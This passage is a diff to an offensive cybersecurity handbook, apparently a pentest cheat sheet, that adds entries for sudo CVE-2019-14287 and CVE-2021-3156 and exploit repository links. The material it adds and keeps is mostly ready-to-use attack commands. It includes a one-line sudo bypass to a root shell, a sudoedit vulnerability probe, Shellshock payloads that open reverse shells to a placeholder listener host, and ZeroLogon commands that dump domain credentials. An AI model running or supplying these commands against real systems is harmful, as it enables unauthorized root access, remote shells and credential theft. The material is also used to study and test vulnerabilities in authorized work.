@@ -2,9 +2,10 @@
 
 ## Table of Contents
 
-- [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-0847-Dirty-Pipe-LPE)
 - [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2014-6271-Shellshock-RCE-PoC)
+- [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2019-14287-Sudo-Bypass)
 - [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2020-1472-ZeroLogon-PE)
+- [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021–3156-Sudo--sudoedit-LPE)
 - [CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-41773-CVE-2021-42013-CVE-2020-17519-Simples-Apache-Path-Traversal-0-day)
 - [CVE-2021-44228: Log4Shell RCE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-44228-Log4Shell-RCE-0-day)
 - [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-0847-Dirty-Pipe-LPE)
@@ -43,7 +44,8 @@
 | CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
 | CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
 | CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
-| CVE-2021-3156 | Sudo 1.8.31 Root Exploit LPE | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
+| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
+| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
 | CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
 | CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
 | CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
@@ -111,6 +113,21 @@ $ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http
 $ shellshock='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
 $ <environment_variable>='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
 $ <environment_variable>='() { :;}; echo exploit' sudo /root/<binary>
+```
+
+## CVE-2019-14287: Sudo Bypass
+
+> https://www.exploit-db.com/exploits/47502
+
+### Pre-requisites
+
+- Sudo version < 1.8.28
+
+### Exploitation
+
+```c
+!root:
+$ sudo -u#-1 /bin/bash
 ```
 
 ## CVE-2020-1472: ZeroLogon PE
@@ -252,6 +269,32 @@ if __name__ == '__main__':
 $ python3 zerologon_tester.py <HANDLE> <RHOST>
 $ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
+
+## CVE-2021–3156: Sudo / sudoedit LPE
+
+> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
+
+### Pre-requisistes
+
+- Ubuntu 20.04 (Sudo 1.8.31)
+- Debian 10 (Sudo 1.8.27)
+- Fedora 33 (Sudo 1.9.2)
+- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1
+
+### Vulnerability Test
+
+```c
+$ sudoedit -s /
+```
+
+The machine is vulnerable if one of the following message is shown.
+
+```c
+sudoedit: /: not a regular file
+segfault
+```
+
+Not vulnerable if the error message starts with `usage:`.
 
 ## CVE-2021-41773, CVE-2021-42013, CVE-2020-17519: Simples Apache Path Traversal (0-day)
 
